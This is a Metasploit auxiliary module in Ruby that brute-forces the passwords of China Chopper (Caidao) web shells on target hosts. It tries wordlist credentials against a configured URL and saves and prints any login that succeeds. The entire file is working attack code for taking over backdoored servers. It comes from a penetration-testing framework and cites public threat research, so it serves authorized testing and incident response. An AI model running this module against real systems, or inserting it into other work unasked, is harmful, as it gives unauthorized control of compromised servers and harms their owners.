##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/caidao'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chinese Caidao Backdoor Bruteorce',
      'Description'    => 'This module attempts to brute chinese caidao asp/php/aspx backdoor.',
      'Author'         => [ 'Nixawk' ],
      'References'     => [
        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html'],
        ['URL', 'https://www.exploit-db.com/docs/27654.pdf'],
        ['URL', 'https://www.us-cert.gov/ncas/alerts/TA15-313A'],
        ['URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
      ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URL that handles the login process', '/caidao.php']),
        OptPath.new('PASS_FILE', [
          false,
          'The file that contains a list of of probable passwords.',
          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
        ])
      ], self.class)
  end

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::Caidao.new(
      configure_http_login_scanner(
        uri: datastore['TARGETURI'],
        method: datastore['HTTP_METHOD'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end
end
